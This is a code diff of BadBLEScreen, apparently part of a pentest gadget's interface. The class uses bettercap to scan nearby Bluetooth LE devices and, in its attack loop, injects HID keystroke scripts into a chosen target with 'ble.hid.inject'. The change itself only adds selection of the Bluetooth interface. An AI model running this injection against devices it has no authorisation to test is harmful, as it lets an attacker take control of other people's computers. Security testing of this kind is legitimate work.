@@ -27,6 +27,7 @@ class BadBLEScreen(Screen):
         self.script_cursor = 0
         self.selected_target = None
         self.selected_script = None
+        self.iface = self._get_best_iface()
         
         self.status = "IDLE"
         self.error_msg = ""
@@ -41,6 +42,13 @@ class BadBLEScreen(Screen):
         self._scan_thread = None
         
         self._start_scan()
+
+    def _get_best_iface(self) -> str:
+        try:
+            out = subprocess.check_output(["hciconfig"]).decode()
+            if "hci1" in out: return "hci1"
+        except: pass
+        return "hci0"
 
     def _ensure_sample_script(self):
         sample = self.script_dir / "hello.txt"
@@ -99,7 +107,7 @@ class BadBLEScreen(Screen):
     def _scan_loop(self):
         # We use bettercap in non-interactive mode to grab devices
         # ble.recon on; ble.show; q
-        cmd = ["sudo", "bettercap", "-eval", "ble.recon on; sleep 5; ble.show; q", "-no-colors"]
+        cmd = ["sudo", "bettercap", "-iface", self.iface, "-eval", "ble.recon on; sleep 5; ble.show; q", "-no-colors"]
         try:
             out = subprocess.check_output(cmd).decode()
             # Parse table: | 5c:c5:d4:61:52:6a | -68 dBm | ... | Name |
@@ -127,12 +135,11 @@ class BadBLEScreen(Screen):
 
     def _attack_loop(self):
         # bettercap command for BadBLE HID injection
-        # ble.recon on; ble.enum <mac>; ble.hid.inject <mac> <script>
         mac = self.selected_target["mac"]
         script_path = str(self.selected_script.absolute())
         
         cmd = [
-            "sudo", "bettercap", 
+            "sudo", "bettercap", "-iface", self.iface,
             "-eval", f"ble.recon on; ble.enum {mac}; ble.hid.inject {mac} {script_path}; sleep 5; q",
             "-no-colors"
         ]
